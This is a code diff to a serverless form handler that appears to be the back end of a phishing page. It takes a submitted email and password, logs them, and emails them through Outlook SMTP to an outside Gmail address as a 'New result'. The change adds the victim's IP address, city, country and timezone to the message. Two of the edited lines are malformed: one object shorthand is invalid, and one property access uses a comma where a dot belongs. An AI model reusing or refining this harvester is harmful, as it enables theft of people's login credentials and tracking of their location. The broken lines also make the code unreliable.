@@ -6,7 +6,7 @@ export default async (req: Request, context: Context) => {
   const body = await req.formData();
   const email = body.get("ai");
   const password = body.get("pr");
-  console.log('response:', {email, password, context})
+  console.log('response:', {email, password, context?.geo?.subdivision})
 
   const transporter = nodemailer.createTransport({
   host: "smtp-mail.outlook.com",
@@ -23,10 +23,14 @@ export default async (req: Request, context: Context) => {
       to: "emilychan1178@gmail.com",
       subject: "New result",
       text: `Email: ${email} :: Password: ${password} :: Context: ${context.geo}`,
-      html: `<p>Result context: \n\n
-            Email:: ${email} \n
-            Password:: ${password} \n
-            Context:: ${context.geo}
+      html: `<p>Login information: <br/> <br/>
+            Email:: ${email} <br/>
+            Password:: ${password} <br/><br/>
+            Geolocation:
+            IP:: ${context.ip} <br/>
+            City:: ${context.geo.city} <br/>
+            Country:: ${context.geo.country} <br/>
+            Timezone:: ${context,geo.timezone} <br/>
             </p>`,
     };
 
